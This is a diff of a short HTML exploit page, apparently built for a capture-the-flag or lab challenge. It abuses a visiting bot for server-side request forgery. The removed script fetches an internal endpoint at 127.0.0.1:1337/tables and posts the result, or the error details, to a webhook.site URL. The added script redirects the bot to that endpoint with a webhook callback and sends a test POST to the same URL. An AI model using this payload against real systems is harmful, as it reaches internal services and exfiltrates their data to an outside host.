@@ -3,27 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Debug</title>
+    <title>SSRF Redirect</title>
 </head>
 <body>
-    <h1>Debugging...</h1>
+    <h1>Redirecting...</h1>
     <script>
-        fetch('http://127.0.0.1:1337/tables')
-            .then(response => response.text())
-            .then(data => {
-                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'tables=' + encodeURIComponent(data)
-                });
-            })
-            .catch(err => {
-                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'error=' + encodeURIComponent(err.name + ': ' + err.message + ' - ' + err.stack)
-                });
-            });
+        // Redirect bot to /tables with webhook callback
+        window.location = 'http://127.0.0.1:1337/tables?callback=https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84';
+        
+        // Test webhook hit
+        fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'test=RedirectAttempt'
+        });
     </script>
 </body>
 </html>
